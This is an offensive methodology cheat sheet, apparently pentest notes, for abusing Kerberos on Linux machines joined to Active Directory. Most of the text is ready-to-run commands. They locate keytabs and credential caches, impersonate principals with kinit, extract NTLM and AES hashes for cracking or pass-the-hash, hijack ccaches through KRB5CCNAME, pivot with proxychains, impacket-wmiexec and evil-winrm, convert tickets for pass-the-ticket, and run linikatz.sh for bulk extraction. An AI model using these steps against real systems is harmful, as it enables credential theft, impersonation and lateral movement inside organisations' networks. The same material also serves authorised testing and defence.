## Methodology

1. Confirm AD integration by checking for domain enrollment or active identity services.,
2. Search for Kerberos artifacts:
    - Keytab files in common directories or referenced in automation scripts.,,
    - Active credential caches in `/tmp` or referenced in environment variables.,
3. Evaluate access level:
    - Unprivileged: Target owned keytabs or active session caches.,
    - Root: Access any user ccache or the system keytab at `/etc/krb5.keytab`.,,
4. Execute abuse:
    - Keytab: Use for direct principal impersonation or extract hashes for cracking and Pass-the-Hash.,,
    - Ccache: Inject into the current session to access remote resources.
5. Pivot or convert:
    - Use proxying to leverage tickets from an attack host via Impacket or Evil-WinRM.,
    - Convert between Linux (ccache) and Windows (kirbi) formats for cross-platform abuse.

---

## AD Integration Discovery

When seeing unexpected users or if the machine is suspected to be domain-joined, check the realm configuration.,

Check domain membership and permitted login groups:

```
realm list
```

Identify running identity services like sssd or winbind if realm is unavailable:

```
ps -ef | grep -i "winbind|sssd"
```

**Gotchas** **Missing realm tool** requires manual process inspection to confirm domain status.

## Keytab Discovery

When searching for persistent credentials or service accounts, scan the filesystem for keytab files and scheduled tasks.,

Locate files with keytab in the name:

```
find / -name *keytab* -ls 2>/dev/null
```

Inspect cronjobs for scripts utilizing kinit with keytab files:

```
crontab -l
```

View the content of a discovery script to find specific keytab paths:

```
cat <FILE_PATH>
```

**Gotchas** **Lack of read/write privileges** on the keytab file prevents its use or extraction.

## Keytab Impersonation

When a keytab is found and the principal is known, use it to obtain a TGT without a password.,

Identify the principal associated with a keytab:

```
klist -k -t <FILE_PATH>
```

Request a TGT for the principal using the keytab:

```
kinit <USERNAME>@<DOMAIN> -k -t <FILE_PATH>
```

**Gotchas** **Principal names are case-sensitive** and must match the klist output exactly.

## Keytab Hash Extraction

When direct impersonation is insufficient or a plaintext password is required for local authentication, extract the underlying hashes.

Extract NTLM and AES hashes from a keytab file:

```
python3 <FILE_PATH_TO_KEYTABEXTRACT> <FILE_PATH>
```

**Gotchas** **Outdated keytabs** containing hashes for old passwords will result in authentication failure.

## Ccache Abuse

When root access is achieved or a user session is active, hijack the Kerberos credential cache.,

Identify the current user's cache location:

```
env | grep -i krb5
```

List all available caches in the default storage directory:

```
ls -la /tmp
```

Inject a hijacked ccache into the current session:

```
export KRB5CCNAME=<FILE_PATH>
```

**Gotchas** **Expired tickets** inside a ccache file will not work; check the expiration date with klist. **Ccache files are temporary** and may disappear or change during user logout.

## Remote Kerberos Abuse

When attacking from a non-domain machine or pivoting through a compromised host, use Kerberos-aware tools over a proxy.

Configure name resolution for the target domain:

```
cat /etc/hosts
```

Authenticate to a remote system using a hijacked ticket via Impacket:

```
proxychains impacket-wmiexec <TARGET_NAME> -k -no-pass
```

Connect via Evil-WinRM using Kerberos:

```
proxychains evil-winrm -i <TARGET_NAME> -r <DOMAIN>
```

**Tool comparison**

- Impacket → `impacket-wmiexec <TARGET_NAME> -k` → Prefer for general WMI/SMB execution.
- Evil-WinRM → `evil-winrm -i <TARGET_NAME> -r <DOMAIN>` → Prefer when WinRM is available and krb5-user is configured.

> ⚠️ Gap: Impacket requires the **target machine name** instead of an IP address to correctly request and use Kerberos service tickets.

**Dangerous / misconfigured settings**

- Missing `FILE:` prefix in `KRB5CCNAME` on certain Linux AD implementations may cause Impacket to fail.

## Ticket Conversion

When moving tickets between Linux and Windows environments for Pass-the-Ticket attacks.

Convert a Linux ccache to a Windows-compatible kirbi file:

```
impacket-ticketConverter <FILE_PATH> <OUTPUT_NAME>.kirbi
```

**Gotchas** **Conversion does not renew** the ticket; if it is expired in ccache, it remains expired in kirbi.,

## Automated Extraction

When root access is obtained and a quick sweep of all identity-related secrets is needed.

Execute automated credential and ticket extraction:

```
./linikatz.sh
```

**Gotchas** **Root privileges are required** to access the various Kerberos implementation databases and files.